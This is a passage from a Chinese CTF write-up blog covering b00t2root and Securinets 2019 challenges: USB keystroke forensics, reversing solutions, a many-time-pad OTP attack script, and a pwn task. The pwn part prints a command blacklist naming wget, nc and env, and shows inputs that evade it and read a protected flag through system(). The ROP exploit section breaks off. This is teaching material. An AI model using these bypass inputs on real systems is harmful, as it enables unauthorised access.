35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22USER=tonyPWD=/home/tonyHOME=/home/tonySSH_CLIENT=127.0.0.1 57394 22SSH_TTY=/dev/pts/1MAIL=/var/mail/tonyTERM=xtermSHELL=/bin/bashSHLVL=1LOGNAME=tonyPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games_=/usr/bin/env 还是在/proc/1/下查看environ，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag： 123456789101112131415tony@e2797a47d8f5:~$ ps -auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 18376 3044 pts/0 Ss 11:28 0:00 bash /tmp/42.shroot 14 0.0 0.0 72296 3356 ? Ss 11:28 0:00 /usr/sbin/sshdroot 16 0.0 0.0 55952 3300 pts/0 S 11:28 0:00 su -l stevesteve 18 0.0 0.0 18508 3412 pts/0 S 11:28 0:00 -susteve 64 0.0 0.0 45188 5572 pts/0 S+ 11:56 0:00 ssh -i /home/stroot 65 0.0 0.0 103852 7340 ? Ss 11:56 0:00 sshd: tony [pritony 80 0.0 0.0 103852 3528 ? R 11:56 0:00 sshd: tony@pts/tony 81 0.0 0.0 18508 3500 pts/1 Ss 11:56 0:00 -bashtony 91 0.0 0.0 36700 3140 pts/1 R+ 11:58 0:00 ps -auxtony@e2797a47d8f5:~$ cat /proc/1/environcat: /proc/1/environ: Permission deniedtony@e2797a47d8f5:~$ sed '' /proc/1/environPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root&#123;1_44aaaaaammmm_gr0000000ooooooOOO7777&#125;HOME=/root forensicskey_me_baby用 wireshark 打开后发现都是 usb 流量。用 tshark 把流量导出（中间几个 grep 把非 usb 流量筛选掉）： 1tshark -r data.pcapng -T fields -e usb.capdata | grep -E \"^.&#123;23&#125;$\" | grep -v 00:00:00:00:00:00:00:00 &gt; usbdata.txt 然后用脚本跑（之前 XMan 个人赛的时候用过的脚本）： 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonnormalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;output = []keys = open('usbdata.txt')for line in keys: try: if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]==\"00\": continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2'] else: output += ['[unknown]'] except: passkeys.close()flag=0print(\"\".join(output))for i in range(len(output)): try: a=output.index('&lt;DEL&gt;') del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==\"&lt;CAP&gt;\": flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint ('output :' + \"\".join(output)) loopback追踪 tcp 流，把服务器传回客户端的文件导出后，得到一张图片。strings 一下得到 flag： 123$ strings data.png...B00t2root&#123;i_am_the_flag_format&#125; Referenceshttps://www.youtube.com/watch?v=P5RloHad34Qhttps://www.youtube.com/watch?v=68Tgdx_Y8nghttps://www.youtube.com/watch?v=Qg3qOjylZpwhttps://www.youtube.com/watch?v=RmGl1mje1Hohttps://github.com/ziyedbe/b00t2root-19/tree/master/Scatter%20Me","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2019-Securinets-CTF-Quals","slug":"2019-Securinets-CTF-Quals","date":"2019-03-25T00:45:10.000Z","updated":"2019-08-26T01:16:29.378Z","comments":true,"path":"2019/03/25/2019-Securinets-CTF-Quals/","link":"","permalink":"qianfei11.coding.me/2019/03/25/2019-Securinets-CTF-Quals/","excerpt":"比赛的时候做了四道题，顺便复现几道没做出来的题目。","text":"比赛的时候做了四道题，顺便复现几道没做出来的题目。 ReversingAutomateMe12root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped 用 radare2 分析一下： 12345678910111213141516171819202122232425262728293031root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin -- Execute commands on a temporary offset by appending &apos;@ offset&apos; to your command.[0x000005d0]&gt; aaa[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)Invalid instruction of 16366 bytes at 0x124[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)...[x] Type matching analysis for all functions (aaft)[x] Use -AA or aaaa to perform additional experimental analysis.[0x000005d0]&gt; s main[0x000006da]&gt; pdfLinear size differs too much from the bbsum, please use pdr instead.[0x000006da]&gt; pdrDo you want to print 1316 lines? (y/N) y...| 0x00000786 3c68 cmp al, 0x68 ; &apos;h&apos;| ; DATA XREF from main (+0x173d3)| 0x00000788 7416 je 0x7a0| ----------- true: 0x000007a0 false: 0x0000078a| ; DATA XREF from main (+0x1742f)| 0x0000078a 488d3de57c02. lea rdi, str.nope_: ; 0x28476 ; &quot;nope :( &quot; ; const char *format| ; DATA XREF from main (+0x1758d)| 0x00000791 b800000000 mov eax, 0| ; DATA XREF from main (+0x17681)| 0x00000796 e815feffff call sym.imp.printf ; int printf(const char *format)| ; DATA XREF from main (+0x1776e)| 0x0000079b e9007c0200 jmp 0x283a0... 在0x00000786处可以看到将输入的某个字符与h进行了比较。 1234567891011121314151617181920...| ----------- true: 0x000283a0| ; CODE XREF from main (0x788)| ; DATA XREF from main (+0x17869)| 0x000007a0 488b45e0 mov rax, qword [s]| ; DATA XREF from main (+0x17928)| 0x000007a4 4883c008 add rax, 8| ; DATA XREF from main (+0x179e7)| 0x000007a8 488b00 mov rax, qword [rax]| ; DATA XREF from main (+0x17a86)| 0x000007ab 0fb64002 movzx eax, byte [rax + 2] ; [0x2:1]=76| ; DATA XREF from main (+0x17b4c)| 0x000007af 8845ff mov byte [local_1h], al| ; DATA XREF from main (+0x17bdd)| 0x000007b2 8075ffeb xor byte [local_1h], 0xeb| ; DATA XREF from main (+0x17ca3)| 0x000007b6 807dff8e cmp byte [local_1h], 0x8e| ; DATA XREF from main (+0x17d70)| 0x000007ba 7416 je 0x7d2... 往下看变得复杂了一些，将输入和0xeb异或了一下再与0x8e比较，故这里的字符是chr(0xeb^0x8e)=&#39;e&#39;。 事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag： 正则匹配： 12345678910#!/usr/bin/env pythonimport rewith open('bin.c', 'rb') as f: txt = f.read() regex = re.compile(r'\\'(.*)\\'') # print regex.findall(txt) output = '' for c in regex.findall(txt): output += c print output 输出 flag： 12$ ./solve.py | grep -E \"flag|securinets\"... here is you flag securinets&#123;automating_everything_is_the_new_future&#125; ... Warmup: Welcome to securinets CTF!12root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmupwarmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped ltrace 一下，大概能看出做了什么： 123456789101112131415161718root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmupputs(\"Welcome to securinets quals CTF \"...Welcome to securinets quals CTF :)) = 35printf(\"PASSCODE:\") = 9fgets(PASSCODE:ABC123\"ABC123\\n\", 100, 0x7f6912b8aa00) = 0x55e762c220e0strlen(\"ABC123\\n\") = 7...malloc(137) = 0x55e763504a80strlen(\"QUJDMTIzCgCA/gMAcP4AADhpAAABABBp\"...) = 136...strlen(\"QUJDMTIz\") = 8strlen(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef\"...) = 62...puts(\"NOPE :( \"NOPE :() = 9exit(0 &lt;no return ...&gt;+++ exited (status 0) +++ 放进 ida 里看看 main 函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int length; // eax _BOOL4 v4; // ebx int v5; // ebx int v6; // ebx int v7; // ebx int v8; // ebx int v9; // ebx int v10; // ebx int v11; // ebx int v12; // ebx int v13; // ebx int v14; // ebx int v15; // ebx int v16; // ebx int v17; // ebx int v18; // ebx int v19; // ebx int v20; // ebx int v21; // ebx int v22; // ebx int v23; // ebx int v24; // ebx int v25; // ebx int v26; // ebx int v27; // ebx int i; // [rsp+8h] [rbp-1C8h] int j; // [rsp+Ch] [rbp-1C4h] char *s; // [rsp+18h] [rbp-1B8h] int v32[102]; // [rsp+20h] [rbp-1B0h] unsigned __int64 v33; // [rsp+1B8h] [rbp-18h] v33 = __readfsqword(0x28u); puts(\"Welcome to securinets quals CTF :)\"); printf(\"PASSCODE:\", a2); fgets(passcode, 100, stdin); for ( i = 0; i &lt; strlen(passcode); ++i ) v32[i] = passcode[i]; length = sub_89A(0x64u); s = (char *)malloc(length + 1); base64_encode((__int64)v32, 0x64u, (__int64)s); for ( j = 0; j &lt; strlen(s) &amp;&amp; s[j] != 'C'; ++j ) base64_string[j] = s[j]; base64_string[strlen(base64_string)] = 0; v4 = sub_B88(base64_string); v5 = (unsigned __int64)sub_C07(base64_string) + v4; v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5; v7 = (unsigned __int64)sub_E25(base64_string) + v6; v8 = (unsigned __int64)sub_C90(base64_string) + v7; v9 = (unsigned __int64)sub_CAD(base64_string) + v8; v10 = (unsigned __int64)sub_CDA(base64_string) + v9; v11 = (unsigned __int64)sub_DA8(base64_string) + v10; v12 = (unsigned __int64)sub_DF4(base64_string) + v11; v13 = (unsigned __int64)sub_E6E(base64_string) + v12; v14 = (unsigned __int64)sub_ECA(base64_string) + v13; v15 = (unsigned __int64)sub_EF7(base64_string) + v14; v16 = (unsigned __int64)sub_F53(base64_string) + v15; v17 = (unsigned __int64)sub_FAF(base64_string) + v16; v18 = (unsigned __int64)sub_E51(s) + v17; v19 = (unsigned __int64)sub_107E(base64_string) + v18; v20 = (unsigned __int64)sub_10AF(base64_string) + v19; v21 = (unsigned __int64)sub_10E0(base64_string) + v20; v22 = (unsigned __int64)sub_10FD(base64_string) + v21; v23 = (unsigned __int64)sub_112A(base64_string) + v22; v24 = (unsigned __int64)sub_11FB(base64_string) + v23; v25 = (unsigned __int64)sub_1234(base64_string) + v24; v26 = (unsigned __int64)sub_1287(base64_string) + v25; v27 = (unsigned __int64)sub_12B6(base64_string) + v26; if ( v27 + (unsigned int)sub_1309(base64_string) == 25 ) &#123; puts(\"Good job! u know what to do and submit!\"); &#125; else &#123; puts(\"NOPE :(\"); free(s); &#125; return 0LL;&#125; 一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/env pythonimport base64def pos(x,y): for i in range(len(y)): if y[i] == x: return itable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'enc = [0] * 36enc[0] = ord(table[28])enc[3] = ord('j')enc[4] = enc[0] + 1enc[12] = enc[4] - 1enc[22] = enc[4] - 1enc[24] = enc[4] - 1enc[1] = ord(table[54])enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) &gt;&gt; 2) + 1])enc[10] = enc[2]enc[6] = enc[3] - 32enc[7] = ord('p')enc[11] = 48enc[23] = 48enc[35] = enc[11] + 9enc[8] = enc[0] - 1enc[27] = enc[4] + 2enc[31] = enc[27]enc[9] = enc[27] + 7enc[25] = enc[27] + 7enc[13] = enc[1] + 1enc[17] = enc[1] + 1enc[21] = enc[1] + 1enc[15] = enc[7] + 3enc[14] = enc[15] + 1enc[19] = ord('z')enc[34] = enc[0] - 33enc[5] = 88enc[20] = 88enc[29] = 88enc[33] = 88enc[26] = 49enc[16] = enc[9] - 32enc[28] = enc[16]enc[18] = enc[7] - 30enc[30] = enc[18]enc[32] = enc[4]flag = ''for i in enc: flag += chr(i)flag = base64.b64decode(flag)print 'flag:', flag CryptoUseless Admin题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。 12345678910111213141516&#123; \"cipher_list\": [ \"1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f\", \"1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f\", \"1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c\", \"1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e\", \"1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347\", \"0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b\", \"1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40\" ], \"cipher_flag\": \"1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b\"&#125; 同时我找到了一篇2017 年 AlexCTF 中类似的 writeup，用的是 github 上的一个attack 脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = '1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940'c2 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f'c3 = '1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d'c4 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f'c5 = '1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c'c6 = '1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e'c7 = '1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347'c8 = '0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42'c9 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542'c10 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b'c11 = '1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = '1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b'# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*300# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*300) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)final_key_hex = ''.join([val if val is not None else '00' for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))print \"Fix this sentence:\"print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"# WAIT.. MANUAL STEP HERE# This output are printing a * if that character is not known yet# fix the missing characters like this: \"Let*M**k*ow if *o&#123;*a\" = \"cure, Let Me know if you a\"# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good key#target_plaintext = \"cure, Let Me know if you a\"target_plaintext = \"i wanted to end the world, but i'll settle for ending yours.\"print \"Fixed:\"print target_plaintext+\"\\n\"key = strxor(target_cipher.decode('hex'),target_plaintext)print \"Decrypted msg:\"for cipher in ciphers: print strxor(cipher.decode('hex'),key)print \"\\nPrivate key recovered: \"+key+\"\\n\" 具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个cli 工具，让还原 key 更简单，截图如下： PwnWelcome给了个 ssh，然后无法执行 welcome 以及查看 flag.txt： 1234567891011121314151617$ pwd/home/welcome$ whoamiwelcome$ ls -altotal 56dr-xr-xr-x 2 welcome welcome 4096 Mar 23 20:23 .drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..-rw-r--r-- 1 root root 0 Mar 25 02:13 .bash_history-rw-r--r-- 1 welcome welcome 0 Mar 24 00:22 .bash_logout-rw-r--r-- 1 welcome welcome 1 Mar 24 13:33 .bashrc-rw-r--r-- 1 welcome welcome 655 May 16 2017 .profile-r-------- 1 welcome-cracked welcome-cracked 76 Mar 23 20:23 flag.txt-r--------+ 1 welcome-cracked welcome 8712 Mar 23 19:09 welcome-rw-r----- 1 root root 175 Mar 23 12:27 welcome.c-r-s--x--- 1 welcome-cracked welcome 13088 Mar 23 20:13 wrapper-rw-r--r-- 1 root root 1741 Mar 23 20:13 wrapper.c wrapper 是可以执行的，源码也能查看，可以大致看看做了什么： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* author : Anis_Boss */#include &lt;stdio.h&gt;int search(char str[], char word[])&#123; int l, i, j; /*length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = 0, j = 0; str[i] != '\\0' &amp;&amp; word[j] != '\\0'; i++) &#123; if (str[i] == word[j]) &#123; j++; &#125; else &#123; j = 0; &#125; &#125; if (j == l) &#123; /* substring found */ return (i - j); &#125; else &#123; return - 1; &#125;&#125;int delete_word(char str[], char word[], int index)&#123; int i, l; /* length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = index; str[i] != '\\0'; i++) &#123; str[i] = str[i + l + 1]; &#125;&#125;void main(int argc, char* argv[])&#123;char * blacklist[]=&#123;\"cat\",\"head\",\"less\",\"more\",\"cp\",\"man\",\"scp\",\"xxd\",\"dd\",\"od\",\"python\",\"perl\",\"ruby\",\"tac\",\"rev\",\"xz\",\"tar\",\"zip\",\"gzip\",\"mv\",\"flag\",\"txt\",\"python\",\"perl\",\"vi\",\"vim\",\"nano\",\"pico\",\"awk\",\"grep\",\"egrep\",\"echo\",\"find\",\"exec\",\"eval\",\"regexp\",\"tail\",\"head\",\"less\",\"cut\",\"tr\",\"pg\",\"du\",\"`\",\"$\",\"(\",\")\",\"#\",\"bzip2\",\"cmp\",\"split\",\"paste\",\"diff\",\"fgrep\",\"gawk\",\"iconv\",\"ln\",\"most\",\"open\",\"print\",\"read\",\"&#123;\",\"&#125;\",\"sort\",\"uniq\",\"tee\",\"wget\",\"nc\",\"hexdump\",\"HOSTTYPE\",\"$\",\"arch\",\"env\",\"tmp\",\"dev\",\"shm\",\"lock\",\"run\",\"var\",\"snap\",\"nano\",\"read\",\"readlink\",\"zcat\",\"tailf\",\"zcmp\",\"zdiff\",\"zegrep\",\"zdiff\"&#125;; char str[80], word[50]; int index; printf(\"Welcome to Securinets Quals CTF \\o/ \\n\"); printf(\"Enter string:\\n\"); read(0,str,79);for (int i=0;i&lt;sizeof(blacklist)/sizeof(blacklist[0]);i++)&#123; index = search(str, blacklist[i]); if (index != - 1) &#123; delete_word(str, blacklist[i], index); &#125;&#125;setreuid(geteuid(),geteuid());close(0);system(str);&#125; 我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:catccat flagfflag.txtttxtsecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 进阶绕过方式，利用*通配： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/bin/ca* fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 高级绕过方式，sed 正则匹配： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:sed '' fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 官方给的 wp： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/lib64/ld-linux-x86-64.so.2 ./welcomesecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; Baby one1234567$ checksec ./baby1[*] &apos;/Users/qianfei/Desktop/baby1&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida 反编译出 main 函数： 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-30h] setvbuf(_bss_start, 0LL, 2, 0LL); write(1, \"Welcome to securinets Quals!\\n\", 0x1DuLL); return read(0, &amp;buf, 0x12CuLL);&#125; 简单的 rop，利用__libc_csu_init 来 call 函数，达到泄漏和 getshell。Exploit： 